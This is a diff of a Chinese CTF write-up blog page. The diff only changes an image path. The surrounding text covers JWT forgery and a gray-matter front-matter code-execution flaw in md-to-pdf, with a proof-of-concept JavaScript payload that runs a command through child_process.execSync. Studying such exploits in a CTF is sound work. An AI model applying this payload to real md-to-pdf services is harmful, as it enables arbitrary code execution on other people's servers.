@@ -40,7 +40,7 @@
 <p>之后就可以伪造jwt来绕过长度限制了，至于最后的注入点是出在gray-master这个库的解析上，是一个比较冷门的库，并且这个命令执行漏洞是在一个issue中被提出的</p>
 <p><a href="https://github.com/simonhaenisch/md-to-pdf/issues/99">Security: gray-matter exposes front matter JS-engine that leads to arbitrary code execution · Issue #99 · simonhaenisch&#x2F;md-to-pdf</a></p>
 <p>POC</p>
-<p><img src="E:\1CTFdb\1hexo\blog\secrect\刷题和复现和wp\2025HMCTF.assets\image-20250609010815452.png" alt="image-20250609010815452"></p>
+<p><img src="/./2025HMCTF.assets/image-20250609010815452.png" alt="image-20250609010815452"></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; mdToPdf &#125; = <span class="built_in">require</span>(<span class="string">&#x27;md-to-pdf&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;---js\n((require(&quot;child_process&quot;)).execSync(&quot;calc&quot;))\n---RCE&#x27;</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">mdToPdf</span>(&#123; <span class="attr">content</span>: payload &#125;, &#123; <span class="attr">dest</span>: <span class="string">&#x27;./output.pdf&#x27;</span> &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
 
 <p>修改js注入即可RCE，最后是把flag写到根目录的文件中去用软连接读取，因为可下载的目录没有写的权限</p>
